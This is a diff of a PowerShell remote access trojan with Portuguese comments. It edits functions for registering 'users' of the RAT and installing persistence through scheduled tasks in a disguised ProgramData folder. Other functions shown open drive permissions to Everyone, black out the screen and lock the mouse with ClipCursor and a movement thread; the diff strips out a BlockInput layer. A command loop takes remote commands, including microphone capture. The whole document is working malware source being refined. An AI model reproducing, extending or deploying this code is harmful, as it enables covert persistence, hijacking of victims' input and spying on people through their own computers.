@@ -38,41 +38,31 @@ function Write-DebugLog {
 # ===== FUNÇÕES DE USUÁRIO =====
 function Remove-UserFromRAT {
     param([string]$UserName)
-    $removido = $false
     try {
+        $removido = $false
         if (Test-Path $registryPath) { 
             Remove-Item -Path $registryPath -Recurse -Force -ErrorAction SilentlyContinue
             $removido = $true 
         }
-    } catch {
-        Write-DebugLog "Erro ao remover registro: $_"
-    }
-    
-    try {
         if (Test-Path $userListFile) { 
             $users = Get-Content $userListFile -ErrorAction SilentlyContinue
             $users = $users | Where-Object { $_ -ne $UserName }
             $users | Set-Content $userListFile -Force
             $removido = $true
         }
-    } catch {
-        Write-DebugLog "Erro ao remover da lista: $_"
-    }
-    
-    try {
         $tasks = Get-ScheduledTask -TaskPath "\" -ErrorAction SilentlyContinue | Where-Object { $_.TaskName -like "*$installName*" }
         foreach ($task in $tasks) {
             Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false -ErrorAction SilentlyContinue
             $removido = $true
         }
+        if ($removido) { 
+            return "USUARIO_REMOVIDO" 
+        } else { 
+            return "USUARIO_NAO_ENCONTRADO" 
+        }
     } catch {
-        Write-DebugLog "Erro ao remover tarefas: $_"
-    }
-    
-    if ($removido) { 
-        return "USUARIO_REMOVIDO" 
-    } else { 
-        return "USUARIO_NAO_ENCONTRADO" 
+        Write-DebugLog "Erro em Remove-UserFromRAT: $_"
+        return "ERRO_AO_REMOVER" 
     }
 }
 
@@ -97,11 +87,9 @@ function Add-UserToList {
     try {
         New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
         Add-Content -Path $userListFile -Value $UserName -Force
-        
         New-Item -Path $registryPath -Force | Out-Null
         Set-ItemProperty -Path $registryPath -Name "UserName" -Value $UserName -Force
         Set-ItemProperty -Path $registryPath -Name "InstallDate" -Value (Get-Date).ToString() -Force
-        
         return $true
     } catch {
         Write-DebugLog "Erro em Add-UserToList: $_"
@@ -185,19 +173,8 @@ function Install-Persistence {
     }
 }
 
-try {
-    if (-not (Test-Path $scriptPath)) {
-        Install-Persistence
-    } else {
-        $currentScript = Get-Content $MyInvocation.MyCommand.Path -Raw
-        $installedScript = Get-Content $scriptPath -Raw -ErrorAction SilentlyContinue
-        if ($currentScript -ne $installedScript) {
-            Write-DebugLog "Script atualizado, reinstalando persistência"
-            Install-Persistence
-        }
-    }
-} catch {
-    Write-DebugLog "Erro ao verificar persistência: $_"
+if (-not (Test-Path $scriptPath)) {
+    Install-Persistence
 }
 
 # ===== FUNCOES BASICAS =====
@@ -454,51 +431,29 @@ function Unlock-Drives {
             $path = "${drive}\"
             
             if (Test-Path $path) {
-                Write-DebugLog "Drive ${drive} encontrado: $path"
-                
                 $acl = Get-Acl $path
-                Write-DebugLog "ACL obtida para ${drive}"
-                
                 $acl.SetAccessRuleProtection($false, $true)
-                Write-DebugLog "Proteção de herança removida para ${drive}"
                 
                 $rulesToRemove = @()
                 foreach ($rule in $acl.Access) {
                     if ($rule.IdentityReference -eq "Everyone" -and $rule.AccessControlType -eq "Deny") {
                         $rulesToRemove += $rule
-                        Write-DebugLog "Regra de negação encontrada: $($rule.FileSystemRights)"
                     }
                 }
                 
                 foreach ($rule in $rulesToRemove) {
                     $acl.RemoveAccessRule($rule) | Out-Null
-                    Write-DebugLog "Regra removida"
                 }
                 
                 $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
                 $acl.AddAccessRule($accessRule)
-                Write-DebugLog "Permissão total adicionada para Everyone"
-                
                 Set-Acl $path $acl
-                Write-DebugLog "ACL aplicada para ${drive}"
                 
                 $results += "${drive} liberado"
-                
-                try {
-                    $testFile = $path + "test_permission_$(Get-Random).tmp"
-                    [System.IO.File]::WriteAllText($testFile, "test")
-                    Remove-Item $testFile -Force
-                    Write-DebugLog "Teste de escrita OK para ${drive}"
-                } catch {
-                    Write-DebugLog "Teste de escrita falhou para ${drive}: $($_.Exception.Message)"
-                }
-                
+                Write-DebugLog "Drive ${drive} liberado"
             } else {
                 $results += "${drive} não encontrado"
-                Write-DebugLog "Drive ${drive} não encontrado no caminho: $path"
-                
-                $availableDrives = [System.IO.DriveInfo]::GetDrives() | Where-Object { $_.IsReady } | ForEach-Object { $_.Name }
-                Write-DebugLog "Drives disponíveis: $($availableDrives -join ', ')"
+                Write-DebugLog "Drive ${drive} não encontrado"
             }
         } catch {
             Write-DebugLog "Erro ao liberar drive ${drive}: $($_.Exception.Message)"
@@ -509,8 +464,6 @@ function Unlock-Drives {
 }
 
 # ===== TELA PRETA =====
-$global:blackScreenForm = $null
-
 function Black-Screen {
     try {
         $ps = [powershell]::Create()
@@ -551,11 +504,9 @@ function Unlock-Screen {
     }
 }
 
-# ===== TRAVAR MOUSE (VERSÃO CORRIGIDA) =====
+# ===== TRAVAR MOUSE (VERSÃO SIMPLES E ROBUSTA) =====
 $script:mouseLocked = $false
 $script:lockThread = $null
-$script:reinforceThread = $null
-$script:clipCursorSuccess = $false
 
 function Lock-Mouse {
     try {
@@ -567,8 +518,7 @@ function Lock-Mouse {
         
         $script:mouseLocked = $true
         
-        # ===== CAMADA 1: CLIPCURSOR =====
-        Write-DebugLog "CAMADA 1: Tentando ClipCursor via C#"
+        # Tenta ClipCursor (API nativa)
         try {
             $cSharpCode = @'
 using System;
@@ -577,12 +527,6 @@ using System.Windows.Forms;
 public class MouseLocker {
     [DllImport("user32.dll")]
     public static extern bool ClipCursor(ref RECT lpRect);
-    
-    [DllImport("user32.dll")]
-    public static extern bool SetCursorPos(int x, int y);
-    
-    [DllImport("user32.dll")]
-    public static extern int ShowCursor(bool bShow);
     
     [StructLayout(LayoutKind.Sequential)]
     public struct RECT {
@@ -596,8 +540,6 @@ public class MouseLocker {
         rect.right = 1;
         rect.bottom = 1;
         ClipCursor(ref rect);
-        SetCursorPos(0, 0);
-        ShowCursor(false);
     }
     
     public static void Unlock() {
@@ -607,21 +549,17 @@ public class MouseLocker {
         rect.right = Screen.PrimaryScreen.Bounds.Width;
         rect.bottom = Screen.PrimaryScreen.Bounds.Height;
         ClipCursor(ref rect);
-        ShowCursor(true);
     }
 }
 '@
             Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
             [MouseLocker]::Lock()
-            $script:clipCursorSuccess = $true
-            Write-DebugLog "✓ ClipCursor aplicado com sucesso"
+            Write-DebugLog "ClipCursor aplicado com sucesso"
         } catch {
-            Write-DebugLog "✗ Falha no ClipCursor: $_"
-            $script:clipCursorSuccess = $false
+            Write-DebugLog "Falha ao usar ClipCursor: $_"
         }
         
-        # ===== CAMADA 2: THREAD DE MOVIMENTO =====
-        Write-DebugLog "CAMADA 2: Iniciando thread de movimento constante"
+        # Thread de movimento constante (fallback)
         $script:lockThread = [System.Threading.Thread]::new({
             while ($script:mouseLocked) {
                 try {
@@ -634,64 +572,15 @@ public class MouseLocker {
         })
         $script:lockThread.IsBackground = $true
         $script:lockThread.Start()
-        Write-DebugLog "✓ Thread de movimento iniciada"
         
-        # ===== CAMADA 3: REFORÇO =====
-        if ($script:clipCursorSuccess) {
-            Write-DebugLog "CAMADA 3: Iniciando thread de reforço do ClipCursor"
-            $script:reinforceThread = [System.Threading.Thread]::new({
-                while ($script:mouseLocked) {
-                    try {
-                        [MouseLocker]::Lock()
-                        Start-Sleep -Milliseconds 100
-                    } catch {
-                        # Ignora erros
-                    }
-                }
-            })
-            $script:reinforceThread.IsBackground = $true
-            $script:reinforceThread.Start()
-            Write-DebugLog "✓ Thread de reforço iniciada"
-        }
-        
-        # ===== CAMADA 4: BLOQUEIO DE EVENTOS =====
-        Write-DebugLog "CAMADA 4: Tentando bloquear eventos do mouse"
-        try {
-            $blockInputCode = @'
-using System;
-using System.Runtime.InteropServices;
-public class InputBlocker {
-    [DllImport("user32.dll")]
-    public static extern bool BlockInput(bool fBlockIt);
-    
-    public static void Block() {
-        BlockInput(true);
-    }
-    
-    public static void Unblock() {
-        BlockInput(false);
-    }
-}
-'@
-            Add-Type -TypeDefinition $blockInputCode -ErrorAction SilentlyContinue
-            [InputBlocker]::Block()
-            Write-DebugLog "✓ Bloqueio de eventos aplicado"
-        } catch {
-            Write-DebugLog "✗ Falha no bloqueio de eventos: $_"
-        }
-        
+        Write-DebugLog "Thread de movimento iniciada"
         Write-DebugLog "=" * 60
         Write-DebugLog "TRAVAMENTO DO MOUSE CONCLUÍDO"
         Write-DebugLog "=" * 60
         
-        Start-Sleep -Milliseconds 100
-        if ($script:lockThread.IsAlive) {
-            return "MOUSE_LOCKED"
-        } else {
-            return "MOUSE_LOCK_ERROR"
-        }
+        return "MOUSE_LOCKED"
     } catch {
-        Write-DebugLog "❌ ERRO CRÍTICO em Lock-Mouse: $_"
+        Write-DebugLog "Erro ao travar mouse: $_"
         return "MOUSE_LOCK_ERROR"
     }
 }
@@ -704,39 +593,18 @@ function Unlock-Mouse {
         
         $script:mouseLocked = $false
         
-        if ($script:clipCursorSuccess) {
-            try {
-                [MouseLocker]::Unlock()
-                Write-DebugLog "✓ ClipCursor liberado"
-            } catch {
-                Write-DebugLog "✗ Erro ao liberar ClipCursor: $_"
-            }
-        }
-        
+        # Tenta liberar via ClipCursor
         try {
-            [InputBlocker]::Unblock()
-            Write-DebugLog "✓ Bloqueio de eventos liberado"
+            [MouseLocker]::Unlock()
+            Write-DebugLog "ClipCursor liberado"
         } catch {
-            Write-DebugLog "✗ Erro ao liberar bloqueio de eventos: $_"
+            Write-DebugLog "Falha ao liberar ClipCursor: $_"
         }
         
+        # Para a thread
         if ($script:lockThread -and $script:lockThread.IsAlive) {
             $script:lockThread.Abort()
-            Write-DebugLog "✓ Thread de movimento abortada"
-        }
-        
-        if ($script:reinforceThread -and $script:reinforceThread.IsAlive) {
-            $script:reinforceThread.Abort()
-            Write-DebugLog "✓ Thread de reforço abortada"
-        }
-        
-        try {
-            Add-Type -AssemblyName System.Windows.Forms
-            [System.Windows.Forms.Cursor]::Clip = New-Object System.Drawing.Rectangle(0, 0, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
-            [System.Windows.Forms.Cursor]::Show()
-            Write-DebugLog "✓ Cursor liberado via Cursor.Clip"
-        } catch {
-            Write-DebugLog "✗ Erro ao forçar liberação: $_"
+            Write-DebugLog "Thread de movimento abortada"
         }
         
         Write-DebugLog "=" * 60
@@ -745,7 +613,7 @@ function Unlock-Mouse {
         
         return "MOUSE_UNLOCKED"
     } catch {
-        Write-DebugLog "❌ ERRO CRÍTICO em Unlock-Mouse: $_"
+        Write-DebugLog "Erro ao liberar mouse: $_"
         return "MOUSE_UNLOCK_ERROR"
     }
 }
@@ -881,11 +749,9 @@ while ($true) {
                 $writer.WriteLine((Unlock-Screen))
             } elseif ($cmd -eq "lock_mouse") {
                 $result = Lock-Mouse
-                Write-DebugLog "Resultado lock_mouse: $result"
                 $writer.WriteLine($result)
             } elseif ($cmd -eq "unlock_mouse") {
                 $result = Unlock-Mouse
-                Write-DebugLog "Resultado unlock_mouse: $result"
                 $writer.WriteLine($result)
             } elseif ($cmd -eq "mic") {
                 $writer.WriteLine((Get-Microphone))
